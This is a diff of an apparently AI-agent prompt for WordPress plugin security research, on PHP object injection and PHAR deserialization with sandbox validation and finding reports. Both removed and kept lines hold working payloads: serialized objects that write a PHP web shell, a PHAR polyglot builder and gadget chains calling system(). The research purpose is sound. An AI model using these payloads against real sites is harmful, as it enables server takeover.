@@ -200,83 +200,16 @@ if (isset($_COOKIE['asgarosforum_unread_exclude'])) {
 **Why vulnerable:** `maybe_unserialize()` on cookie data = unauthenticated object injection. `sanitize_text_field()` only strips HTML tags — serialized PHP objects pass through unchanged. Fires on every page load, no auth needed. Fix: switched entirely to `json_encode()`/`json_decode()`.
 **Detection:** `maybe_unserialize()` or `unserialize()` on `$_COOKIE`, `$_POST`, `$_GET`, `$_REQUEST` values. Also check for `maybe_unserialize()` on `get_option()`/`get_post_meta()` values that were originally user-controlled.
 
-### CVE-2024-32830: BuddyForms — PHAR Deserialization via file_get_contents()
-**Impact:** Unauthenticated PHAR Deserialization → RCE, CVSS 9.3
-
-```php
-// User-supplied URL passed to file_get_contents() — supports phar:// wrapper
-$url = wp_kses_post(wp_unslash($_REQUEST['url']));
-$image_data = file_get_contents($url);
-// If url = "phar:///tmp/uploaded_evil.jpg"
-// PHP auto-deserializes PHAR metadata without calling unserialize()!
-```
-
-**Why vulnerable:** `file_get_contents()` (and `file_exists()`, `is_file()`, `getimagesize()`, etc.) automatically deserializes PHAR metadata when given a `phar://` URI. Attacker uploads a PHAR polyglot disguised as an image, then triggers deserialization via the file_get_contents call. Fix: check for `phar://` prefix or use `wp_http_validate_url()` which blocks non-HTTP schemes.
-**Detection:** Any filesystem function (`file_exists`, `is_file`, `file_get_contents`, `fopen`, `getimagesize`, `readfile`, `unlink`) with user-controlled path. Even `realpath()` on a `phar://` path triggers deserialization.
-
-### Systemic Pattern: recursive_unserialize_replace() in Backup/Migration Plugins
-**Impact:** Varies — typically requires admin access but dangerous in chain attacks
-
-```php
-// This pattern is copied from interconnectit/Search-Replace-DB into dozens of plugins
-if (is_serialized($data)) {
-    $unserialized = @unserialize($data);  // No allowed_classes restriction!
-    $data = recursive_unserialize_replace($from, $to, $unserialized, true);
-}
-// Found in: UpdraftPlus, Clone, Search & Replace, String Locator, WP Migrate DB
-```
-
-**Why dangerous:** The `@unserialize()` call has no `allowed_classes` parameter, allowing arbitrary object instantiation. While these typically require admin access (for backup/migration operations), they're exploitable when combined with CSRF or auth bypass vulnerabilities. Fix: add `['allowed_classes' => false]` to `unserialize()`.
-**Detection:** `@unserialize($` without second parameter, especially in functions named `*replace*`, `*migrate*`, `*import*`, `*restore*`.
+- **CVE-2024-32830 (BuddyForms):** PHAR deser via `file_get_contents()` on user-supplied URL — unauth RCE, CVSS 9.3. Any filesystem function with user path + `phar://` wrapper.
+- **Systemic: `recursive_unserialize_replace()`** in backup/migration plugins (UpdraftPlus, WP Migrate DB, etc.) — `@unserialize()` without `allowed_classes`.
 
 ---
 
 ## Attack Techniques
 
-### 1. Basic Serialized Object Injection
-```php
-// Target class with dangerous __destruct
-class FileWriter {
-    public $file;
-    public $data;
-    public function __destruct() {
-        file_put_contents($this->file, $this->data);
-    }
-}
+> Basic serialized object payloads and phar file creation are standard — focus on finding the right gadget chain for the target environment.
 
-// Payload
-$obj = new FileWriter();
-$obj->file = '/var/www/html/shell.php';
-$obj->data = '<?php system($_GET["c"]); ?>';
-$payload = serialize($obj);
-// O:10:"FileWriter":2:{s:4:"file";s:28:"/var/www/html/shell.php";s:4:"data";s:31:"<?php system($_GET["c"]); ?>";}
-```
-
-### 2. Phar File Creation
-```php
-<?php
-// Create malicious phar file
-class Evil {
-    public $cmd = 'id';
-    function __destruct() {
-        system($this->cmd);
-    }
-}
-
-$phar = new Phar('evil.phar');
-$phar->startBuffering();
-$phar->setStub('GIF89a' . '<?php __HALT_COMPILER(); ?>');  // Polyglot!
-$phar->setMetadata(new Evil());  // Payload in metadata
-$phar->addFromString('test.txt', 'test');
-$phar->stopBuffering();
-
-// Rename to .gif for upload
-rename('evil.phar', 'evil.gif');
-
-// Trigger via: phar://uploads/evil.gif/test.txt
-```
-
-### 3. WordPress Gadget Chains
+### WordPress Gadget Chains
 
 **PHPMailer Chain (if present):**
 ```php
@@ -297,38 +230,9 @@ O:34:"Requests_Utility_FilteredIterator":2:{s:8:"callback";s:6:"system";s:8:"dat
 O:24:"GuzzleHttp\Psr7\FnStream":2:{s:33:"\0GuzzleHttp\Psr7\FnStream\0methods";a:1:{s:5:"close";s:6:"system";}s:9:"_fn_close";s:2:"id";}
 ```
 
-### 4. Monolog Gadget (Common in WP plugins)
-```php
-// Monolog\Handler\SyslogUdpHandler
-O:35:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{...}}
-```
+**Monolog** (common in WP plugins): `Monolog\Handler\SyslogUdpHandler` → `BufferHandler` chain.
 
-### 5. Partial Object Control
-```php
-// Even if you can't control the class, control properties
-// If plugin has:
-class Settings {
-    public $callback;
-    public $args;
-    public function __destruct() {
-        call_user_func($this->callback, $this->args);
-    }
-}
-
-// Inject:
-O:8:"Settings":2:{s:8:"callback";s:6:"system";s:4:"args";s:2:"id";}
-```
-
-### 6. Type Juggling in Deserialization
-```php
-// Serialized boolean/null can bypass checks
-O:4:"User":1:{s:5:"admin";b:1;}  // admin = true
-O:4:"User":1:{s:5:"admin";N;}    // admin = null (might pass !isset checks)
-
-// Integer vs string
-O:4:"User":1:{s:2:"id";i:1;}     // id as integer
-O:4:"User":1:{s:2:"id";s:1:"1";} // id as string "1"
-```
+> Also consider: partial object control (control properties of existing plugin classes with `__destruct`/`__call` → `call_user_func`), and type juggling in serialized booleans/nulls to bypass auth checks.
 
 ---
 
@@ -408,22 +312,6 @@ wpguard_sandbox_request(
 
 ## Finding Creation
 
-**IMPORTANT: Every finding description MUST include a `## Prerequisites` section** using this exact structured format. Every field must be explicitly filled — no omissions, no vague descriptions.
-
-```markdown
-## Prerequisites
-- **Base plugins:** [WooCommerce 8.0+] or [None]
-- **Plugin settings:** [Settings > Uploads > Enable file uploads = ON] or [Default settings]
-- **Required content:** [At least one published product with featured image] or [None]
-- **Required roles/users:** [WooCommerce `customer` role] or [Default WordPress roles]
-- **WordPress config:** [Multisite enabled] or [Standard single-site]
-- **Sandbox setup steps:**
-  1. `wpguard_sandbox_install_plugin(slug="woocommerce")` or [None — no extra setup]
-```
-
-Every field MUST have either a specific value or an explicit "[None]" / "[Default ...]". Vague entries like "check plugin settings" will be rejected by QA.
-
-
 ```python
 wpguard_finding_create(
     plugin_slug="example-plugin",
@@ -431,48 +319,20 @@ wpguard_finding_create(
     active_installs=50000,
     vuln_type="object_injection",  # or phar_deserialization
     title="PHP Object Injection via Import Feature Leading to RCE",
-    description="""
-## Vulnerability Summary
-Unserialize of user-controlled data allows arbitrary object instantiation, leading to RCE via gadget chain.
+    description="""## Vulnerability Summary
+Unserialize of user-controlled data via AJAX action "import_config" allows
+arbitrary object instantiation → RCE via CacheHandler.__destruct() gadget
+(file_put_contents with controlled path/data).
 
 ## Data Flow
-Entry: AJAX action "import_config" (admin)
-  ↓
-Input: $_POST['config_data'] - Base64 encoded serialized data
-  ↓
-Processing: $config = unserialize(base64_decode($_POST['config_data']));
-  ↓
-Gadget: Plugin class CacheHandler has:
-  - __destruct() calls file_put_contents($this->file, $this->data)
-  ↓
-Exploitation: Inject CacheHandler object with shell path
-
-## Gadget Chain
-```php
-class CacheHandler {
-    public $cache_file;    // Controlled: /var/www/html/shell.php
-    public $cache_data;    // Controlled: <?php system($_GET['c']); ?>
-
-    public function __destruct() {
-        file_put_contents($this->cache_file, $this->cache_data);
-    }
-}
-```
-
-## Payload
-```
-O:12:"CacheHandler":2:{s:10:"cache_file";s:28:"/var/www/html/shell.php";s:10:"cache_data";s:31:"<?php system($_GET['c']); ?>";}
-```
+$_POST['config_data'] → base64_decode → unserialize() → CacheHandler.__destruct()
 
 ## Prerequisites
-None — works with default plugin settings.
-
-## Impact
-- Remote Code Execution
-- Full server compromise
-- Data theft, ransomware, etc.
-    """,
-    auth_level="administrator",  # Even admin-level is valuable for object injection
+- **Base plugins:** [None]
+- **Plugin settings:** [Default settings]
+...
+""",
+    auth_level="administrator",
     cvss_score=7.2,
     cvss_vector="CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
     affected_file="includes/import.php",
@@ -495,92 +355,4 @@ Object Injection without gadget: 4.0-6.0 (potential impact)
 
 ---
 
-## Common WordPress Gadgets to Check
-
-```
-# Check if these libraries exist in plugin or WordPress
-- PHPMailer (wp-includes/PHPMailer/)
-- Requests (wp-includes/Requests/)
-- SimplePie (wp-includes/SimplePie/)
-- PHPUnit (if dev dependencies included)
-- Guzzle (popular in plugins)
-- Monolog (popular in plugins)
-- Swift Mailer
-- Doctrine
-- Laravel components
-
-# WordPress core classes to examine
-- WP_Theme
-- WP_Widget_*
-- WP_Session_Tokens
-- WP_Object_Cache
-```
-
----
-
-## Dynamic Validation REQUIRED
-
-**You MUST test findings in the sandbox before saving.** Static analysis alone is not sufficient.
-
-- **`status="validated"`** — ONLY if you performed a `wpguard_sandbox_request()` that confirms the vulnerability (e.g., serialized payload triggers deserialization, gadget chain executes, file created/deleted)
-- **`status="draft"`** — If static analysis is promising but sandbox testing was inconclusive, failed, or you ran out of turns. Include what you tried and what happened.
-
-**Never save a finding as "validated" based on code reading alone.** A promising code path that fails dynamic testing is a draft, not a finding. This prevents false positives from wasting the entire downstream pipeline (PoC Writer → PoC Runner → QA).
-
----
-
-## Progress Saving (CRITICAL)
-
-**Save findings IMMEDIATELY as you discover them — do NOT accumulate findings in memory.**
-
-1. The moment you identify a vulnerability, call `wpguard_finding_create()` right away
-2. If unsure, create it as `status="draft"` — drafts are reviewed by QA, never lost
-3. Do NOT wait until the end to report — if you run out of context, unsaved findings are LOST
-4. The PM and poc-writer will handle PoC scripts — your job is to find vulns and save them
-
-### Progress Report (REQUIRED before finishing)
-
-Before your final response to the PM, save a progress report to `reports/{plugin_slug}/progress_{agent_name}.md` with:
-
-```markdown
-# Progress Report: {agent_name} on {plugin_slug}
-
-## Files Analyzed
-- [x] includes/ajax.php — fully analyzed
-- [x] includes/admin.php — fully analyzed
-- [ ] includes/api.php — partially analyzed (stopped at line 250)
-- [ ] lib/import.php — NOT analyzed
-
-## Findings Created
-- {finding_id}: {title} (status: {draft/validated})
-
-## Remaining Work
-- includes/api.php lines 250+ — has register_rest_route calls not yet reviewed
-- lib/import.php — contains unserialize() call, needs full trace
-- All shortcode handlers in includes/shortcodes/ — not yet checked
-
-## Notes
-- {any patterns observed, areas that looked promising but need more time}
-```
-
-**Why this matters:** If you run out of context, the PM will relaunch you (or another expert) with this progress report so analysis continues from where you left off instead of restarting from scratch.
-
----
-
-## When Finished
-
-Report all findings back to the PM. For each finding, include:
-- Vulnerability type, affected file/function/line
-- Data flow (entry point → processing → sink)
-- Authentication level required
-- Suggested CVSS score and vector
-- Whether exploitation was verified or if it's a draft finding (static analysis only)
-
-Also report:
-- **Progress report saved:** `reports/{plugin_slug}/progress_{agent_name}.md`
-- **Analysis complete:** YES / PARTIAL (ran out of context — {N} files remain)
-- If PARTIAL, list the most promising unanalyzed areas so the PM can relaunch
-
-The PM will coordinate the PoC Writer and verification pipeline.
-
-**Remember: The vulnerability IS there. Your job is to find it. Don't give up.**
+{{include:_expert-shared.md|validation_example=serialized payload triggers deserialization, gadget chain executes, file created/deleted}}
